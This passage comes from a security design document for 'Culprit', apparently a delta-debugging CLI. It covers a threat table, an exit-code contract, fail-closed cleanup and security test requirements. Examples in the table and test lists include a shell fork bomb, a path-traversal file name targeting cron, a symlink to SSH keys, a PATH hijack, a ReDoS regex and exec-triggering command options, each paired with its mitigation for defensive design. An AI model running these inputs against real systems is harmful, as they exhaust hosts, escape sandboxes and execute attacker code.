| 5 | `PYTHONPATH` interpreter hook | A Python tool loads attacker code because `PYTHONPATH` points into the sandbox. | Supply-chain-free local code execution. | Set Python variables explicitly; deny untrusted `PYTHONPATH`; verify tool dependencies independently. |
| 6 | `IFS` word-splitting manipulation | Snapshot sets `IFS` so that an internal script splits a value differently. | Option injection or altered command semantics. | Reject `IFS`; do not propagate untrusted shell variables. |
| 7 | `PATH` hijack through an early entry | Snapshot sets `PATH=/workspace/bin:$PATH`, where `make` or `git` is planted. | Victim tool invokes the malicious binary instead of the system binary. | Use absolute allowlisted executables; construct a trusted `PATH`; reject untrusted directory entries. |
| 8 | Symlink escape during cwd copy | Snapshot cwd contains a symlink to `/home/user/.ssh`. Culprit follows it while copying the workspace. | Copying or overwriting files outside the sandbox. | Reject or isolate symlinks; use `O_NOFOLLOW`-style semantics; verify the sandbox boundary after every copy. |
| 9 | Path-traversal file name | A selected input is named `../../../../etc/cron.d/entry`. Culprit joins it beneath the sandbox. | Absolute or relative escape and privileged file creation. | Reject separators and `..`; construct paths from the base directory; compare the real path to the canonical sandbox root. |
| 10 | Baseline-file TOCTOU | Attacker replaces a baseline file with a symlink after the policy check but before the child reads it. | Reading or writing an arbitrary file; experimental oracle corruption. | Open the baseline once with atomic, symlink-resistant semantics; use a verified copy; do not reopen by name. |
| 11 | Fork-bomb or runaway child | Command executes `:(){ :|:& };:` or spawns many workers. | Host resource exhaustion and denial of service. | Bound process count, CPU, memory, and runtime; kill the process group; reap descendants; require containment. |
| 12 | Infinite output flood | Command writes gigabytes to stdout or stderr. | Disk or memory exhaustion. | Cap captured bytes; truncate safely; use bounded buffers; stop reading after the cap is reached. |
| 13 | Infinite loop or blocking command | Command never returns or waits for input. | Worker hang, queue exhaustion, and false comparison. | Enforce wall-clock and CPU-time limits; send escalating signals; record timeout distinctly from failure. |
| 14 | Billion-laughs YAML | CI snapshot uses repeated aliases to expand into billions of nodes. | Memory exhaustion during parsing. | Use safe YAML parsing, depth and node caps, and bounded alias expansion. |
| 15 | Unsafe pickle snapshot | Attacker supplies a `.pkl` file claiming to be a cached snapshot. | Arbitrary code execution during unpickling. | Do not support pickle for interchange; use JSON or another plain format; validate after parsing. |
| 16 | ReDoS in ignore patterns | User provides `(a+)+b` and a long matching path list. | CPU exhaustion and denial of service. | Use a linear-time engine, analyze patterns, cap input length and match time, and isolate the matcher. |
| 17 | Secret leakage into a report | Snapshot contains a token in an environment value; Culprit echoes the “minimal diff.” | Credential disclosure through terminal, log, or saved report. | Redact secret-shaped values structurally; replace with named references; block secret-file import. |
| 18 | False causal claim from a flaky command | A test passes once and fails once with the same factors. Ddmin returns a minimal set anyway. | User trusts a misleading root cause and changes the environment unsafely. | Repeat experiments; estimate variance; test necessity and sufficiency; print “inconclusive” when evidence is insufficient. |

## 12. Exit codes must distinguish refusal, execution failure, timeout, invalid experiments, and causal conclusions

Culprit’s exit code is part of its external contract. It must never collapse execution errors, policy refusals, inconclusive experiments, and valid causal findings into the same generic failure code.

### Recommended exit-code contract

| Exit code | Meaning | When to use |
|---:|---|---|
| 0 | Success and a valid causal conclusion | Necessity and sufficiency were verified, or the protocol explicitly supports the printed conclusion. |
| 1 | CLI or configuration error | Bad arguments, unsupported platform state, unreadable config, or internal invariant failure. |
| 2 | Policy refusal | A required safety check was not satisfied and execution was refused. |
| 3 | Command execution failure | The child ran but exited with a non-zero status unrelated to the causal oracle. |
| 4 | Timeout or resource limit | The child was killed because of a wall-clock, CPU, memory, process, disk, or output limit. |
| 5 | Inconclusive experiment | Outcome variance, leakage, or missing repetitions prevented a reliable conclusion. |
| 6 | Invalid experiment | The executable, sandbox, baseline, or oracle could not be constructed safely. |
| 10 | Candidate or supported cause found | A candidate set reproduced the result, but the conclusion does not meet the stricter proof policy. |
| 64 | Configuration-parsing error | YAML, JSON, regex, or schema validation failed. |
| 78 | No cause identified within bounds | Delta debugging completed without finding a valid candidate set. |

Exit codes should remain stable across minor releases. If the tool supports a “strict proof” mode, the user should be able to request that only an independently verified conclusion returns exit code `0`; candidates should return `10`.

### Error handling must fail closed

Errors must be handled according to the following hierarchy:

1. **Safety failure:** refuse execution.
2. **Policy failure:** refuse execution or warn only when the action is read-only and explicitly authorized.
3. **Transient execution failure:** retry only if the policy permits repetition.
4. **Child failure:** record it as an observation, not as CLI success.
5. **Resource failure:** terminate the group, clean up, and report limits.
6. **Parse failure:** abort before importing the malformed data.

A warning must never downgrade a sandbox, PATH, executable, or secret-control violation into an execution. Culprit should log enough information to reproduce the decision without exposing secrets, and it should distinguish a timeout from a non-zero exit code in both its exit status and structured report.

### Cleanup must be deterministic and permission-preserving

The CLI should register a cleanup handler for the sandbox, open files, and process group. Cleanup must:

- signal the process group;
- reap children;
- remove only the sandbox tree it created;
- refuse to remove paths outside that tree; and
- never follow symlinks during deletion.

It should also run a final check for leaked descendants. On POSIX systems, `SIGKILL` may not be handled by the child, so a brief wait and escalation are required. The tool should not report success merely because the wrapper process exited.

If the process is killed by an external signal, Culprit should preserve the signal information where possible and return a non-zero status. It must not interpret a signal-truncated run as a successful counterexample.

## 13. Development gates must reproduce every refusal, limit, and invalid-state transition

A secure design is not complete until its unsafe paths are exercised. The test suite must demonstrate that the default configuration refuses the operation, while authorized opt-in paths enable it only under the documented conditions.

### Unit and property tests should cover unsafe inputs

Tests should include:

- shell metacharacters, newlines, tabs, Unicode whitespace, and Unicode minus signs;
- options such as `--output`, `--exec`, `--checkpoint-action=exec`, `--upload-pack`, `--init-file`, and `-e`;
- deep, wide, and alias-heavy YAML and JSON documents;
- pickle and full-loader inputs;
- nested-quantifier and overlapping-alternation regexes;
- long strings and long path components;
- absolute paths and `..` traversal;
- symlinks, hard links, FIFOs, devices, and sockets;
- secret-like values in environment variables, files, and output;
- malformed locale, timezone, and umask values; and
- manipulated baselines.

Each test should assert that Culprit refuses execution or limits the operation. Passing a value through unchanged is not sufficient evidence of safety.

### Integration tests must verify isolation, cleanup, and reproducibility

The suite should spawn deliberately malicious child commands, including:

- fork bombs;
- background daemons;
- PTY or input waiters;
- symlink swappers;
- disk fillers;
- CPU burners; and
- children that attempt to write outside the sandbox.

The tests must verify that:

- the process group is killed;
- no descendant survives;
- no attacker-chosen path outside the sandbox is created;
- no secret appears in logs;
- timeout is not confused with failure; and
- exit codes follow the documented contract.

These tests should run only in disposable containers or virtual machines.

### Delta-debugging tests must include interaction and nondeterminism

The algorithm should be tested against cases where:

- a single factor is sufficient;
- two or more factors interact;
- removal of one factor flips the result only conditionally;
- a factor is irrelevant but correlated with a causal factor; and
- the command outcome varies across otherwise identical runs.

The expected result for an indeterminate command is “inconclusive,” not a fabricated minimal set. If ddmin selects a factor set through a lucky ordering, repetition must expose the result’s instability.

### Supply-chain controls must extend to build and test execution

CI must pin dependencies and Python tooling, run static analysis for shell usage and dangerous deserialization, and test CLI runs on a non-root, unprivileged account. Build artifacts and caches must be separated from source repositories.

No test should rely on real cloud credentials. Synthetic token patterns may be used, but they must be rejected by the secret-redaction logic. A repository that contains a secret should not be required to reproduce a legitimate safety failure.

## 14. Final assurance depends on refusing unsafe defaults and preserving the boundary between replay and proof

Culprit should be built as a constrained experiment runner, not as a shell wrapper. Its security posture must assume that every command, repository, snapshot, config file, baseline, filename, environment variable, locale, timezone, regex, and output fragment is adversarial.

The most important design decisions are:

- do not execute until explicitly authorized;
- do not parse untrusted data as code;
- do not inherit a privileged environment;
- do not follow untrusted filesystem links;
- do not trust a single exit code as an oracle;
- do not treat one successful replay as proof; and
- do not print a causal claim when the experiment is inconclusive.

If those rules are enforced, Culprit can be useful for local debugging without turning repositories, CI artifacts, or malformed configuration files into trusted execution contexts. Its safety depends less on how convincing its report appears than on whether every unsafe operation was refused or explicitly authorized before the experiment began.

## References

The following sources establish general security principles used in this model. They are not documentation for Culprit itself.

[1] Python Software Foundation. *subprocess — Subprocess Management*. https://docs.python.org/3/library/subprocess.html  
> “The underlying process creation and management in this module is handled by the Popen class.”

[2] Python Software Foundation. *PEP 324 – subprocess - New process module*. https://peps.python.org/pep-0324/  
> “If the program is started through the shell, and the arguments contain shell meta characters, the result can be disastrous.”

[3] man7.org. *ld.so(8) — Linux manual page*. https://www.man7.org/linux/man-pages/man8/ld.so.8.html  
> “For security reasons, if the dynamic linker determines that a binary should be run in secure-execution mode, the effects of some environment variables are voided or modified.”

[4] MITRE. *Hijack Execution Flow: LD_PRELOAD (T1574.006)*. https://attack.mitre.org/techniques/T1574/006/  
> “Adversaries may execute their own malicious payloads by hijacking the dynamic linker used to load libraries.”

[5] MITRE. *CWE List*. https://cwe.mitre.org/index.html  
> “The Common Weakness Enumeration (CWE) is a community-developed list of common software and hardware weakness types.”

[6] Python Software Foundation. *pickle — Python object serialization*. https://docs.python.org/3/library/pickle.html  
> “It is possible to construct malicious pickle data which will execute arbitrary code during unpickling.”

[7] OpenStack Security. *Avoid dangerous file parsing and object serialization libraries*. https://security.openstack.org/guidelines/dg_avoid-dangerous-input-parsing-libraries.html  
> “yaml.safe_load yaml.load pickle Allows creating arbitrary Python objects.”

[8] Google. *RE2, a regular expression library*. https://github.com/google/re2  
> “RE2 was designed and implemented with an explicit goal of being able to handle regular expressions from untrusted users without risk.”

[9] CVE. *CVE-2025-68146*. https://www.cve.org/CVERecord?id=CVE-2025-68146  
> “A Time-of-Check-Time-of-Use (TOCTOU) race condition allows local attackers to corrupt or truncate arbitrary user files through symlink attacks.”

[10] MITRE. *CVE-2026-103435*. https://nvd.nist.gov/vuln/detail/CVE-2026-103435  
> “This time-of-check to time-of-use (TOCTOU) gap allowed an attacker who could write to the workspace to atomically replace a project file with a symlink.”

[11] OWASP. *OS Command Injection Defense Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html  
> “OS command injection is a type of injection where software constructs a system command using external influenced input.”

[12] RTI International. *Reproducibility: A Primer on Semantics and Implications for Research*. https://www.rti.org/rti-press-publication/reproducibility-primer/fulltext.pdf  
> “The production of corroborating results in a new study by having followed the same experimental methods.”
